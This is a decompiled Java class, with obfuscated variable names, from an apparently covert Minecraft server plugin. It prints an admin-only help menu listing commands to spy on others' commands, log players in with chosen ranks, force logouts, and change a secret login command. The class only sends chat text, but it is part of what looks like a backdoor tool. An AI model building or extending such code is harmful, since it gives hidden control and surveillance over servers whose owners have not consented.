/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.help;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.methods.Tips;
import me.system.runner.utils.Settings;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class AdminhelpCommand
extends Command {
    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllllllIIlllIIllIIIIIl, String lllllllllllllllllIIlllIIlIllllll, String[] lllllllllllllllllIIlllIIlIlllIII, Player lllllllllllllllllIIlllIIlIllllII) {
        int lllllllllllllllllIIlllIIlIlllIll = 1;
        if (lllllllllllllllllIIlllIIllIIIIIl.admin.contains(lllllllllllllllllIIlllIIlIllllII.getName())) {
            if (lllllllllllllllllIIlllIIlIlllIII.length <= 1) {
                lllllllllllllllllIIlllIIlIllllII.sendMessage(Settings.USAGE(String.valueOf(new StringBuilder().append("adminhelp <1-").append(lllllllllllllllllIIlllIIlIlllIll).append(">"))));
            } else if (lllllllllllllllllIIlllIIlIlllIII[1].equalsIgnoreCase("1")) {
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(String.valueOf(new StringBuilder().append("         ").append(Settings.DARK_RED).append(Settings.NAME).append(" by ").append("Wendellmeset")));
                lllllllllllllllllIIlllIIlIllllII.sendMessage("");
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7spy &8l &fSpys on everyones ").append(Settings.NAME).append(" commands"))));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7login &8l &fLogins another user"));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7listranks &8l &fLists all available ranks you can log in players with!"));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7forcelogout &8l &fLogouts another user"));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&7logoutall &8l &fLogs out all other users logged in"));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7setlogincmd &8l &fChanges the ").append(Settings.NAME).append(" Login Command!"))));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&7setname &8l &fReplaces the name ").append(Settings.NAME).append(" with another name, do not use color codes!"))));
                lllllllllllllllllIIlllIIlIllllII.sendMessage("");
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(new StringBuilder().append("&8(").append(Settings.DARK_RED).append("Tip&8) l &7").append(Tips.getTip()))));
                lllllllllllllllllIIlllIIlIllllII.sendMessage(ChatColor.translateAlternateColorCodes((char)'&', (String)"&8&m----------------------------------"));
            }
        } else {
            lllllllllllllllllIIlllIIlIllllII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    public AdminhelpCommand() {
        AdminhelpCommand lllllllllllllllllIIlllIIlllIIlll;
    }
}

